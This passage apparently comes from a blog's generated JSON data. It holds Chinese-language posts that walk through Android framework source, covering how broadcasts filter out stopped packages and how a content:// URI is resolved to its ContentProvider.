class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">  <span class=\"keyword\">private</span> <span class=\"keyword\">void</span> <span class=\"title function_\">buildResolveList</span><span class=\"params\">(Intent intent, FastImmutableArraySet&lt;String&gt; categories,</span></span><br><span class=\"line\"><span class=\"params\">          <span class=\"type\">boolean</span> debug, <span class=\"type\">boolean</span> defaultOnly, String resolvedType, String scheme,</span></span><br><span class=\"line\"><span class=\"params\">          F[] src, List&lt;R&gt; dest, <span class=\"type\">int</span> userId)</span> &#123;</span><br><span class=\"line\">      <span class=\"comment\">// ...</span></span><br><span class=\"line\">      <span class=\"keyword\">final</span> <span class=\"type\">boolean</span> <span class=\"variable\">excludingStopped</span> <span class=\"operator\">=</span> intent.isExcludingStopped();</span><br><span class=\"line\"><span class=\"comment\">// ...</span></span><br><span class=\"line\">      <span class=\"keyword\">for</span> (i=<span class=\"number\">0</span>; i&lt;N &amp;&amp; (filter=src[i]) != <span class=\"literal\">null</span>; i++) &#123;</span><br><span class=\"line\">          <span class=\"comment\">// ...</span></span><br><span class=\"line\">          <span class=\"keyword\">if</span> (excludingStopped &amp;&amp; isFilterStopped(filter, userId)) &#123;</span><br><span class=\"line\">              <span class=\"keyword\">if</span> (debug) &#123;</span><br><span class=\"line\">                  Slog.v(TAG, <span class=\"string\">&quot;  Filter&#x27;s target is stopped; skipping&quot;</span>);</span><br><span class=\"line\">              &#125;</span><br><span class=\"line\">              <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"comment\">// ...</span></span><br><span class=\"line\">  &#125;</span><br></pre></td></tr></table></figure>\n\n<p>这是通过intent构造resolve列表的一个私有方法，代码也非常清晰，此判断逻辑 <code>excludingStopped &amp;&amp; isFilterStopped</code> 过滤了最后要启动的组件。其中 <code>isFilterStopped</code> 是真正判断进程是否已停止的方法，而 <strong>excludingStopped</strong> 是我们刚才传入的flag对应的控制标识。所以要过滤掉已停止进程有两个必要条件，<strong>一是这个进程真的死了，二是开发者要通过flag来声明确实需要过滤</strong>（是不是超人性化哈哈哈）。</p>\n<p>因此，我们也可以声明不需要过滤，即给intent设置 <code>FLAG_EXCLUDE_STOPPED_PACKAGES</code> 的兄弟flag：<code>FLAG_INCLUDE_STOPPED_PACKAGES</code> （注意是 <strong>include</strong>），这样在发送广播时，即便是已停止的进程，也能接收到了。这就是上古时期通过广播唤醒死亡进程的方法，现在基本上被各大ROM厂商给优化没了，一般都是三方应用被禁，系统应用依然可以。</p>\n<p>分析到此，其实只是有头有尾，但没有中间过程，<code>broadcastIntentLocked</code> 最终怎么就调到了 <code>buildResolveList</code> 呢？<br>我们回到上面的 <code>broadcastIntentLocked</code> 方法，其中的 <code>receivers</code> 对象存储的是静态广播的集合，<code>registeredReceivers</code> 则是动态广播的集合。我们只看静态广播即可，它来自于 <code>collectReceiverComponents</code> 方法，此方法最后返回的receiver肯定是被过滤后的：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">private</span> List&lt;ResolveInfo&gt; <span class=\"title function_\">collectReceiverComponents</span><span class=\"params\">(Intent intent, String resolvedType,</span></span><br><span class=\"line\"><span class=\"params\">        <span class=\"type\">int</span> callingUid, <span class=\"type\">int</span>[] users)</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">// ...</span></span><br><span class=\"line\">    List&lt;ResolveInfo&gt; receivers = <span class=\"literal\">null</span>;</span><br><span class=\"line\">    <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">// ...</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"type\">int</span> user : users) &#123;</span><br><span class=\"line\">            <span class=\"comment\">// ...</span></span><br><span class=\"line\">            List&lt;ResolveInfo&gt; newReceivers = AppGlobals.getPackageManager()</span><br><span class=\"line\">                    .queryIntentReceivers(intent, resolvedType, pmFlags, user).getList();</span><br><span class=\"line\">            <span class=\"comment\">// ...</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (newReceivers != <span class=\"literal\">null</span> &amp;&amp; newReceivers.size() == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">                newReceivers = <span class=\"literal\">null</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (receivers == <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">                receivers = newReceivers;</span><br><span class=\"line\">            <span class=\"comment\">// ...</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">catch</span> (RemoteException ex) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// pm is in same process, this will never happen.</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> receivers;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这个方法内部逻辑较为简单，我们可以看到最终receivers的来源便是那个 <code>queryIntentReceivers</code> 方法，此方法实现在PMS（PackageManagerService）里面：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Override</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"meta\">@NonNull</span> ParceledListSlice&lt;ResolveInfo&gt; <span class=\"title function_\">queryIntentReceivers</span><span class=\"params\">(Intent intent,</span></span><br><span class=\"line\"><span class=\"params\">        String resolvedType, <span class=\"type\">int</span> flags, <span class=\"type\">int</span> userId)</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ParceledListSlice</span>&lt;&gt;(</span><br><span class=\"line\">            queryIntentReceiversInternal(intent, resolvedType, flags, userId,</span><br><span class=\"line\">                    <span class=\"literal\">false</span> <span class=\"comment\">/*allowDynamicSplits*/</span>));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"meta\">@NonNull</span> List&lt;ResolveInfo&gt; <span class=\"title function_\">queryIntentReceiversInternal</span><span class=\"params\">(Intent intent,</span></span><br><span class=\"line\"><span class=\"params\">        String resolvedType, <span class=\"type\">int</span> flags, <span class=\"type\">int</span> userId, <span class=\"type\">boolean</span> allowDynamicSplits)</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">// ...</span></span><br><span class=\"line\">    <span class=\"keyword\">synchronized</span> (mPackages) &#123;</span><br><span class=\"line\">        <span class=\"type\">String</span> <span class=\"variable\">pkgName</span> <span class=\"operator\">=</span> intent.getPackage();</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (pkgName == <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">final</span> List&lt;ResolveInfo&gt; result =</span><br><span class=\"line\">                    mComponentResolver.queryReceivers(intent, resolvedType, flags, userId);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> applyPostResolutionFilter(</span><br><span class=\"line\">                    result, instantAppPkgName, allowDynamicSplits, callingUid, <span class=\"literal\">false</span>, userId,</span><br><span class=\"line\">                    intent);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">final</span> PackageParser.<span class=\"type\">Package</span> <span class=\"variable\">pkg</span> <span class=\"operator\">=</span> mPackages.get(pkgName);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (pkg != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">final</span> List&lt;ResolveInfo&gt; result = mComponentResolver.queryReceivers(</span><br><span class=\"line\">                    intent, resolvedType, flags, pkg.receivers, userId);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> applyPostResolutionFilter(</span><br><span class=\"line\">                    result, instantAppPkgName, allowDynamicSplits, callingUid, <span class=\"literal\">false</span>, userId,</span><br><span class=\"line\">                    intent);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> Collections.emptyList();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>最终receiver集合的查询操作在私有方法中，由 <code>mComponentResolver.queryReceivers</code> 得来，似乎越来越接近真相了，马上查看ComponentResolver：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">List&lt;ResolveInfo&gt; <span class=\"title function_\">queryReceivers</span><span class=\"params\">(Intent intent, String resolvedType, <span class=\"type\">int</span> flags, <span class=\"type\">int</span> userId)</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">synchronized</span> (mLock) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> mReceivers.queryIntent(intent, resolvedType, flags, userId);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">List&lt;ResolveInfo&gt; <span class=\"title function_\">queryReceivers</span><span class=\"params\">(Intent intent, String resolvedType, <span class=\"type\">int</span> flags,</span></span><br><span class=\"line\"><span class=\"params\">        List&lt;PackageParser.Activity&gt; receivers, <span class=\"type\">int</span> userId)</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">synchronized</span> (mLock) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> mReceivers.queryIntentForPackage(intent, resolvedType, flags, receivers, userId);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这里正好对应上面的两个不同情况下的调用，它们最终都会调用到 <code>queryIntent</code> 方法，此方法在ComponentResolver的一个静态内部类ActivityIntentResolver中实现：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"keyword\">class</span> <span class=\"title class_\">ActivityIntentResolver</span></span><br><span class=\"line\">        <span class=\"keyword\">extends</span> <span class=\"title class_\">IntentResolver</span>&lt;PackageParser.ActivityIntentInfo, ResolveInfo&gt; &#123;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> List&lt;ResolveInfo&gt; <span class=\"title function_\">queryIntent</span><span class=\"params\">(Intent intent, String resolvedType,</span></span><br><span class=\"line\"><span class=\"params\">            <span class=\"type\">boolean</span> defaultOnly, <span class=\"type\">int</span> userId)</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">// ...</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"built_in\">super</span>.queryIntent(intent, resolvedType, defaultOnly, userId);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    List&lt;ResolveInfo&gt; <span class=\"title function_\">queryIntent</span><span class=\"params\">(Intent intent, String resolvedType, <span class=\"type\">int</span> flags,</span></span><br><span class=\"line\"><span class=\"params\">            <span class=\"type\">int</span> userId)</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">// ...</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"built_in\">super</span>.queryIntent(intent, resolvedType,</span><br><span class=\"line\">                (flags &amp; PackageManager.MATCH_DEFAULT_ONLY) != <span class=\"number\">0</span>,</span><br><span class=\"line\">                userId);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">// ...</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>内部类的中的 <code>queryIntent</code> 方法只是做了一些参数处理，进一步调用的是父类的实现，这个父类也就是起初我们提到的 <strong>IntentResolver</strong>：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">  <span class=\"keyword\">public</span> List&lt;R&gt; <span class=\"title function_\">queryIntent</span><span class=\"params\">(Intent intent, String resolvedType, <span class=\"type\">boolean</span> defaultOnly,</span></span><br><span class=\"line\"><span class=\"params\">          <span class=\"type\">int</span> userId)</span> &#123;</span><br><span class=\"line\">      <span class=\"comment\">// ...</span></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (firstTypeCut != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">          buildResolveList(intent, categories, debug, defaultOnly, resolvedType,</span><br><span class=\"line\">                  scheme, firstTypeCut, finalList, userId);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (secondTypeCut != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">          buildResolveList(intent, categories, debug, defaultOnly, resolvedType,</span><br><span class=\"line\">                  scheme, secondTypeCut, finalList, userId);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (thirdTypeCut != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">          buildResolveList(intent, categories, debug, defaultOnly, resolvedType,</span><br><span class=\"line\">                  scheme, thirdTypeCut, finalList, userId);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (schemeCut != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">          buildResolveList(intent, categories, debug, defaultOnly, resolvedType,</span><br><span class=\"line\">                  scheme, schemeCut, finalList, userId);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      filterResults(finalList);</span><br><span class=\"line\">      sortResults(finalList);</span><br><span class=\"line\"><span class=\"comment\">// ...</span></span><br><span class=\"line\">      <span class=\"keyword\">return</span> finalList;</span><br><span class=\"line\">  &#125;</span><br></pre></td></tr></table></figure>\n\n<p>看上面的 <code>buildResolveList</code> 方法，照应了开头分析的结果。最终返回的 <strong>finalList</strong> 也就是过滤之后的receiver集合。</p>\n<h3 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h3><ul>\n<li>在广播发送的前序步骤（位于AMS）里，通过 <code>intent.addFlags(Intent.FLAG_EXCLUDE_STOPPED_PACKAGES);</code> 设置了标识，以声明广播不发给已停止的进程，层层调用后最终在 <strong>IntentResolver</strong> 的 <code>buildResolveList</code> 方法中实现过滤。</li>\n<li>在原生Android的设计逻辑中，若要突破上述限制，在 <code>sendBroadcast</code> 之前，给intent添加 flag：<code>FLAG_INCLUDE_STOPPED_PACKAGES</code> 即可。但鉴于各ROM厂商的正负优化，这个操作已经不适用了。</li>\n</ul>\n"},{"layout":"post","title":"源码茶舍之如何由Uri找寻ContentProvider","subtitle":"品味AOSP。","date":"2020-01-28T16:00:00.000Z","author":"YSY","header-img":"img/home-bg.jpg","catalog":true,"_content":"\n### 引子\n\n我们都知道四大组件之一ContentProvider的用处，它给大家提供一种统一的数据访问格式。调用者无需关心数据源于何处（如DB、XML文件和网络等），只需获取到对应的ContentResolver来进行增删查改即可。\n自己实现一个Provider的时候，也会在配置文件中声明如下：\n\n```xml\n<provider\n    android:name=\".provider.TestProvider\"\n    android:authorities=\"com.xxx.yyy.provider\"\n    android:exported=\"true\"\n    android:readPermission=\"com.xxx.yyy.permission.READ_PROVIDER\" />\n```\n\n其中 `authorities` 是该Provider的唯一标识，所以一般都写成包名与其他字符串的组合形式，若需提供数据给其他应用，则 `exported` 要设为true，同时比较规范的做法还需要加上读写权限。\n然后，我们再从常见的查询操作说起：\n\n```java\nContentResolver r = getContentResolver();\nUri uri = Uri.parse(\"content://com.xxx.yyy.provider/test_path/1\");\nCursor c = r.query(uri, null, null, null, null);\n// ...\n```\n\n如同访问某个网站，我们访问ContentProvider也需要一个URI，其数据格式：\n\n- scheme前缀是固定的： **content://**\n- 授权host：此例中为 **com.xxx.yyy.provider**\n- 路径与参数：此例中为 **test_path/1**\n\n那么，系统是如何通过这样一个URI来锁定对应的ContentProvider呢？\n\n### 找寻\n\n主要涉及源码（基于Android 10）：\n\n```bash\nframeworks/base/core/java/android/content/ContentResolver.java\nframeworks/base/core/java/android/app/ContextImpl.java\nframeworks/base/core/java/android/app/ActivityThread.java\n```\n\n大致思路，便是追踪上述 `query` 方法中的参数uri，看看它的流向。根据源码设计的套路，起初几层调用都是看不到要害之处的，所以我们无需细读。来来来，先看ContentResolver的 `query` 方法：\n\n```java\n    @Override\n    public final @Nullable Cursor query(final @RequiresPermission.Read @NonNull Uri uri,\n            @Nullable String[] projection, @Nullable Bundle queryArgs,\n            @Nullable CancellationSignal cancellationSignal) {\n        // ...\n        // 获取“不稳定”的Provider\n        IContentProvider unstableProvider = acquireUnstableProvider(uri);\n        if (unstableProvider == null) {\n            return null;\n        }\n        IContentProvider stableProvider = null;\n        Cursor qCursor = null;\n        try {\n            // ...\n            try {\n                // 尝试查询操作\n                qCursor = unstableProvider.query(mPackageName, uri, projection,\n                        queryArgs, remoteCancellationSignal);\n            } catch (DeadObjectException e) {\n                // The remote process has died...  but we only hold an unstable\n                // reference though, so we might recover!!!  Let's try!!!!\n                // This is exciting!!1!!1!!!!1\n                // 这段注释我特意没删，感觉特别皮。大意：远程进程已死亡，但我们还持有unstableProvider的引用，快试试回收它的资源！这真是一颗赛艇！（虽然我不知道到底这哪儿exciting了）\n                unstableProviderDied(unstableProvider);\n                // “不稳定”的Provider操作失败，获取“稳定”的Provider\n                stableProvider = acquireProvider(uri);\n                if (stableProvider == null) {\n                    return null;\n                }\n                // 再次尝试查询操作\n                qCursor = stableProvider.query(\n                        mPackageName, uri, projection, queryArgs, remoteCancellationSignal);\n                }\n            if (qCursor == null) {\n                return null;\n            }\n            // ...\n        } catch (RemoteException e) {\n            // ...\n            return null;\n        } finally {\n            // 释放资源\n        }\n    }\n```\n\n从上述源码可得知，有两处代码在根据uri获取ContentProvider，即ContentResolver的 `acquireUnstableProvider` 和 `acquireProvider` 方法。先看看前者（后者最终殊途同归，本文不额外分析）：\n\n```java\n    public final IContentProvider acquireUnstableProvider(Uri uri) {\n        if (!SCHEME_CONTENT.equals(uri.getScheme())) {\n            // 这里硬核匹配字符串，凡是scheme不是content://的直接再见，所以它是固定的\n            return null;\n        }\n        String auth = uri.getAuthority(); // 按例，此处获取到的字符串便包含\"com.xxx.yyy.provider\"\n        if (auth != null) {\n            // 此为ContentResolver中的抽象方法，由子Resolver各自具体实现\n            return acquireUnstableProvider(mContext, uri.getAuthority());\n        }\n        return null;\n    }\n```\n\n于是我们追踪到ContextImpl的静态内部类ApplicationContentResolver：\n\n```java\n    private static final class ApplicationContentResolver extends ContentResolver {\n        @UnsupportedAppUsage\n        private final ActivityThread mMainThread;\n        // ...\n        @Override\n        protected IContentProvider acquireUnstableProvider(Context c, String auth) {\n            return mMainThread.acquireProvider(c,\n                    ContentProvider.getAuthorityWithoutUserId(auth),\n                    resolveUserIdFromAuthority(auth), false);\n        }\n    }\n```\n\n实际调用到ActivityThread当中去了，注意此时传递的关键参数已经是 **auth** 而不是uri了：\n\n```java\n    @UnsupportedAppUsage\n    public final IContentProvider acquireProvider(\n            Context c, String auth, int userId, boolean stable) {\n        // 获取已存在的Provider    \n        final IContentProvider provider = acquireExistingProvider(c, auth, userId, stable);\n        if (provider != null) {\n        \treturn provider;\n        }\n        // ...\n        // 没获取到再尝试安装，这里来个插眼，等会有大用\n        holder = installProvider(c, holder, holder.info,\n                true /*noisy*/, holder.noReleaseNeeded, stable);\n        return holder.provider;\n    }\n```\n\n看源码一般来说最好先深后广，且优先搞清热点代码。接下来我们看 `acquireExistingProvider` 方法：\n\n```java\n    public final IContentProvider acquireExistingProvider( Context c, String auth, int userId, boolean stable) {\n        synchronized (mProviderMap) {\n            final ProviderKey key = new ProviderKey(auth, userId);\n            // 关注这个存储Provider记录的的map，其实这里就是本文重点\n            final ProviderClientRecord pr = mProviderMap.get(key);\n            if (pr == null) {\n                return null;\n            }\n\n            IContentProvider provider = pr.mProvider; // 最终获取Provider实例\n            IBinder jBinder = provider.asBinder();\n            if (!jBinder.isBinderAlive()) {\n                // Provider所在进程已死，直接返回null\n                handleUnstableProviderDiedLocked(jBinder, true);\n                return null;\n            }\n            // ...\n            return provider;\n        }\n    }\n```\n\n分析到这里，就自然而然有几个问题了， **ProviderKey** 是什么，怎么构造的？ **mProviderMap** 又是什么时候填充的？\n带着问题，先看前者：\n\n```java\n    private static final class ProviderKey {\n        final String authority;\n        final int userId;\n\n        public ProviderKey(String authority, int userId) {\n            this.authority = authority;\n            this.userId = userId;\n        }\n\n        @Override\n        public boolean equals(Object o) {\n            // ...\n        }\n\n        @Override\n        public int hashCode() {\n            // ...\n        }\n    }\n```\n\n可见， **ProviderKey** 是ActivityThread当中的一个内部POJO，非常普通，没有对入参做任何特殊处理。那么ContentProvider也就是根据 **authority** 和 **userId** 来唯一确定的，对应了文章开头的介绍。\n此外，由于Android目前是多用户操作系统（国产ROM淡化了此概念，但应用双开、系统分身等功能实现均与多用户有关），所以这里用户id是必要的。\n\n接下来看后一个问题， **mProviderMap** 从哪儿来？什么时候添加的Provider记录？很简单了，还是在ActivityThread当中，实例化如下：\n\n```java\n    @UnsupportedAppUsage\n    final ArrayMap<ProviderKey, ProviderClientRecord> mProviderMap\n        = new ArrayMap<ProviderKey, ProviderClientRecord>();\n```\n\n且仅有一处在进行 `put` 操作：\n\n```java\n    private ProviderClientRecord installProviderAuthoritiesLocked(IContentProvider provider,\n            ContentProvider localProvider, ContentProviderHolder holder) {\n        final String auths[] = holder.info.authority.split(\";\");\n        final int userId = UserHandle.getUserId(holder.info.applicationInfo.uid);\n\n        if (provider != null) {\n            // ...\n        }\n\n        final ProviderClientRecord pcr = new ProviderClientRecord(\n                auths, provider, localProvider, holder);\n        for (String auth : auths) {\n            final ProviderKey key = new ProviderKey(auth, userId);\n            final ProviderClientRecord existing = mProviderMap.get(key);\n            if (existing != null) {\n                // ...\n            } else {\n                mProviderMap.put(key, pcr); // 在此处添加的\n            }\n        }\n        return pcr;\n    }\n```\n\n可见，ProviderClientRecord实例的构造是在这个 `installProviderAuthoritiesLocked` 私有方法中完成并添加到map中的。\n这里有个小插曲**特别注意**：方法的第一行代码，对 **authority** 字符串进行了分割（分隔符为;），最终ProviderClientRecord的数量也取决于分割出来的数组。所以在Manifest配置文件中声明 `android:authorities` 属性时，可以填入多个授权host（就好比多个域名可以同时指向一个网站），以分号分割，难怪属性名要用复数呢。\n\n接下来看看 `installProviderAuthoritiesLocked` 方法的调用处：\n\n```java\n    @UnsupportedAppUsage\n    private ContentProviderHolder installProvider(Context context,\n            ContentProviderHolder holder, ProviderInfo info,\n            boolean noisy, boolean noReleaseNeeded, boolean stable) {\n        ContentProvider localProvider = null;\n        IContentProvider provider;\n        if (holder == null || holder.provider == null) {\n            // ...\n        } else {\n            provider = holder.provider;\n            // ...\n        }\n\n        ContentProviderHolder retHolder;\n\n        synchronized (mProviderMap) {\n            // ...\n            IBinder jBinder = provider.asBinder();\n            if (localProvider != null) {\n                ComponentName cname = new ComponentName(info.packageName, info.name);\n                ProviderClientRecord pr = mLocalProvidersByName.get(cname);\n                if (pr != null) {\n                    // ...\n                } else {\n                    // ...\n                    // 第一处调用\n                    pr = installProviderAuthoritiesLocked(provider, localProvider, holder);\n                    // ...\n                }\n                retHolder = pr.mHolder;\n            } else {\n                ProviderRefCount prc = mProviderRefCountMap.get(jBinder);\n                if (prc != null) {\n                    // ...\n                } else {\n                    // 第二处调用\n                    ProviderClientRecord client = installProviderAuthoritiesLocked(\n                            provider, localProvider, holder);\n                    // ...\n                }\n                retHolder = prc.holder;\n            }\n        }\n        return retHolder;\n    }\n```\n\n由上， `installProviderAuthoritiesLocked` 方法的调用均在 `installProvider` 方法中。还记得上文的“插眼”吗？呼应上了。\n\n### 总结\n\n- 在我们使用ContentResolver来进行查询操作时，`query` 方法层层调用到 **ActivityThread** 的 `acquireExistingProvider` 方法，根据URI字符串当中的授权host（即 **authority** ）和当前所在用户的 **userId** 来获取对应的Provider实例。\n\n- 当 `acquireExistingProvider` 获取不到时，则通过 `installProvider` 方法来安装Provider并把其载体 **ProviderClientRecord** 添加到 **mProviderMap** 中。\n\n- AndroidManifest中声明Provider时， `android:authorities` 属性可以填多个字符串，以分号分割：\n\n  ```xml\n  <provider\n      android:name=\".provider.TestProvider\"\n      android:authorities=\"com.xxx.yyy.provider;cn.xxx.yyy.provider;net.xxx.yyy.provider\"\n      ... />\n  ```\n\n  如此可以写成多种不同host的URI，映射的却还是同一个ContentProvider。具体的好处我能想到的有几点：\n\n  - 与同IP多域名的网站一样，域名多样化，提前抢占一些host，避免三方假冒。\n  - 提供不同的URI分别给内部和外部开发者使用，便于区分和数据统计。\n","source":"_posts/2020-01-29-源码茶舍之如何由Uri找寻ContentProvider.md","raw":"---\nlayout:     post\ntitle:      源码茶舍之如何由Uri找寻ContentProvider\nsubtitle:   品味AOSP。\ndate:       2020-01-29\nauthor:     YSY\nheader-img: img/home-bg.jpg\ncatalog: true\ntags:\n    - Android\n    - AOSP\n---\n\n### 引子\n\n我们都知道四大组件之一ContentProvider的用处，它给大家提供一种统一的数据访问格式。调用者无需关心数据源于何处（如DB、XML文件和网络等），只需获取到对应的ContentResolver来进行增删查改即可。\n自己实现一个Provider的时候，也会在配置文件中声明如下：\n\n```xml\n<provider\n    android:name=\".provider.TestProvider\"\n    android:authorities=\"com.xxx.yyy.provider\"\n    android:exported=\"true\"\n    android:readPermission=\"com.xxx.yyy.permission.READ_PROVIDER\" />\n```\n\n其中 `authorities` 是该Provider的唯一标识，所以一般都写成包名与其他字符串的组合形式，若需提供数据给其他应用，则 `exported` 要设为true，同时比较规范的做法还需要加上读写权限。\n然后，我们再从常见的查询操作说起：\n\n```java\nContentResolver r = getContentResolver();\nUri uri = Uri.parse(\"content://com.xxx.yyy.provider/test_path/1\");\nCursor c = r.query(uri, null, null, null, null);\n// ...\n```\n\n如同访问某个网站，我们访问ContentProvider也需要一个URI，其数据格式：\n\n- scheme前缀是固定的： **content://**\n- 授权host：此例中为 **com.xxx.yyy.provider**\n- 路径与参数：此例中为 **test_path/1**\n\n那么，系统是如何通过这样一个URI来锁定对应的ContentProvider呢？\n\n### 找寻\n\n主要涉及源码（基于Android 10）：\n\n```bash\nframeworks/base/core/java/android/content/ContentResolver.java\nframeworks/base/core/java/android/app/ContextImpl.java\nframeworks/base/core/java/android/app/ActivityThread.java\n```\n\n大致思路，便是追踪上述 `query` 